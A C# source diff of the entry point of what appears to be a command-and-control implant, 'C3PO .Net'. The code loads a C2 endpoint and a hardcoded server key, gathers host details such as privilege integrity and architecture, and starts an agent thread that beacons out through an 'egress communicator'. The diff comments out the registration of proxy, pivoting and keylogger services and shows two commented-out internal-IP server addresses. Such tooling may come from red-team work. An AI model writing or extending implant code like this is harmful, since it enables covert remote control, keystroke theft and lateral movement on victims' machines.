@@ -1,6 +1,7 @@
 ﻿using Agent.Communication;
 using Agent.Models;
 using Agent.Service;
+using Shared;
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
@@ -23,16 +24,20 @@ namespace EntryPoint
         {
 #if DEBUG
             _args = args;
-            Start();
 #endif
-            Start();
+            try
+            {
+                Start().Wait();
+            }
+            catch (Exception ex)
+            {
+#if DEBUG
+                Debug.WriteLine($"Ooops something went wrong : {ex}");
+#endif
+            }
         }
 
-
-
-        static Thread s_agentThread = null;
-
-        public static void Start()
+        public static async Task Start()
         {
             string connUrl = Agent.Properties.Resources.EndPoint;
             string serverKey = Agent.Properties.Resources.Key;
@@ -54,7 +59,7 @@ namespace EntryPoint
                 serverKey = "1yOdEVXef7ljnzrRgINB27Bi4zGwi1v2B664b65hAO7elTTM";
             }
 
-            //connUrl = "https://192.168.174.128";
+            //connUrl = "https://192.168.48.128:443";
 
 #endif
             var connexion = ConnexionUrl.FromString(connUrl);
@@ -75,29 +80,29 @@ namespace EntryPoint
             configService.ServerKey = serverKey;
 
             ServiceProvider.RegisterSingleton<IConfigService>(configService);
-            ServiceProvider.RegisterSingleton<IMessageService>(new MessageService(metaData));
+            ServiceProvider.RegisterSingleton<INetworkService>(new NetworkService());
             ServiceProvider.RegisterSingleton<IFileService>(new FileService());
             ServiceProvider.RegisterSingleton<IWebHostService>(new WebHostService());
 
-            ServiceProvider.RegisterSingleton<IProxyService>(new ProxyService());
-            ServiceProvider.RegisterSingleton<IPivotService>(new PivotService());
-            ServiceProvider.RegisterSingleton<IKeyLogService>(new KeyLogService());
+            //ServiceProvider.RegisterSingleton<IProxyService>(new ProxyService());
+            //ServiceProvider.RegisterSingleton<IPivotService>(new PivotService());
+            //ServiceProvider.RegisterSingleton<IKeyLogService>(new KeyLogService());
 
             
+            var commModule = CommunicationFactory.CreateEgressCommunicator(connexion);
+            var agent = new Agent.Agent(metaData, commModule);
 
 
-            var commModule = CommunicationFactory.CreateCommunicator(connexion);
-            var agent = new Agent.Models.Agent(metaData, commModule);
-
-            s_agentThread = new Thread(agent.Start);
+            var s_agentThread = new Thread(agent.Run);
             s_agentThread.Start();
             s_agentThread.Join();
-        }
 
-        private static void Stop()
-        {
-            // onstop code here
-            s_agentThread.Abort();
+
+           
+
+#if DEBUG
+            Debug.WriteLine("Bye !");
+#endif
         }
 
 
@@ -128,7 +133,7 @@ namespace EntryPoint
                 Architecture = IntPtr.Size == 8 ? "x64" : "x86",
                 Integrity = integrity,
                 EndPoint = endpoint,
-                Version = "C3PO .Net 1.0",
+                Version = "C3PO .Net 1.1",
                 SleepInterval = endpoint.ToLower().StartsWith("http") ? 2 : 0, //pivoting agent
                 SleepJitter = 0
             };
